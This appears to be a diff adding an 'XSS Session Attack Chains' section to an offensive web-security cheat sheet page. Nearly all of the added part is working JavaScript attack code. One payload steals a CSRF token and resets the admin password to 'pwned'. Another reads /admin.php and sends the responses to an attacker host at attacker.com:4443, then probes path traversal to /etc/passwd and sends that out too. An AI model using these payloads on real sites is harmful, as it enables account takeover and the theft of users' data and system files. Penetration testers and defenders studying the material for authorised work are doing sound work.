@@ -631,6 +631,66 @@ done
 curl -sI https://target.com | grep -i "report-only"
 # Content-Security-Policy-Report-Only: → XSS executes freely</code></pre>
 
+  <h2>XSS Session Attack Chains</h2>
+  <p>When you have XSS in a victim's session, you can do far more than alert(1). The victim's cookies and CSRF tokens are accessible, enabling full account takeover and pivoting to admin-only endpoints.</p>
+
+  <h3>Account Takeover — Extract CSRF Token, Change Password</h3>
+  <p>If the password-change form uses a CSRF token but doesn't require the old password, XSS gives you everything needed to take over the account.</p>
+  <pre><code>// Inject via XSS — load from attacker exploit server:
+// &lt;script src="https://exploit.attacker.com/exploit"&gt;&lt;/script&gt;
+
+// Step 1: Fetch the page containing the CSRF token
+var xhr = new XMLHttpRequest();
+xhr.open('GET', '/home.php', false);   // synchronous request
+xhr.withCredentials = true;
+xhr.send();
+
+// Step 2: Parse the DOM and extract the token
+var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
+var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);
+
+// Step 3: Submit the password-change POST with the stolen token
+var csrf_req = new XMLHttpRequest();
+var params = 'username=admin&amp;email=admin@target.com&amp;password=pwned&amp;csrf_token=' + csrftoken;
+csrf_req.open('POST', '/home.php', false);
+csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+csrf_req.withCredentials = true;
+csrf_req.send(params);
+
+// Result: admin account password changed to "pwned" — log in as admin</code></pre>
+
+  <h3>Chaining to Admin-Only Endpoints — LFI Discovery</h3>
+  <p>XSS lets you enumerate endpoints the victim can reach that you can't access directly. Use XSS to exfiltrate responses from internal/admin endpoints and chain into further vulnerabilities (LFI, SSRF, API abuse).</p>
+  <pre><code>// Step 1: Exfiltrate the admin page response via XSS
+var xhr = new XMLHttpRequest();
+xhr.open('GET', '/admin.php', true);
+xhr.withCredentials = true;
+xhr.onload = function() {
+    var exfil = new XMLHttpRequest();
+    exfil.open('POST', 'https://attacker.com:4443/log', true);
+    exfil.setRequestHeader('Content-Type', 'application/json');
+    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
+};
+xhr.send();
+
+// Step 2: Decode the exfiltrated response on your server
+echo 'BASE64_HERE' | base64 -d &gt; admin_response.html
+
+// Step 3: If the admin page accepts ?view= parameter, test for LFI:
+var xhr2 = new XMLHttpRequest();
+xhr2.open('GET', '/admin.php?view=../../../../etc/passwd', true);
+xhr2.withCredentials = true;
+xhr2.onload = function() {
+    var exfil2 = new XMLHttpRequest();
+    exfil2.open('POST', 'https://attacker.com:4443/log', true);
+    exfil2.setRequestHeader('Content-Type', 'application/json');
+    exfil2.send(JSON.stringify({data: btoa(xhr2.responseText)}));
+};
+xhr2.send();</code></pre>
+
+  <h3>Key Principle</h3>
+  <p>XSS vulnerabilities are bounded only by what the victim's session can do. Treat XSS as a full same-origin code execution primitive: enumerate every privileged endpoint, read every form field containing a token or sensitive data, and chain into CSRF, IDOR, or injection vulnerabilities reachable only from the victim's context.</p>
+
   <h2>Tools</h2>
   <ul>
     <li>Burp Suite DOM Invader — DOM XSS source/sink analysis</li>
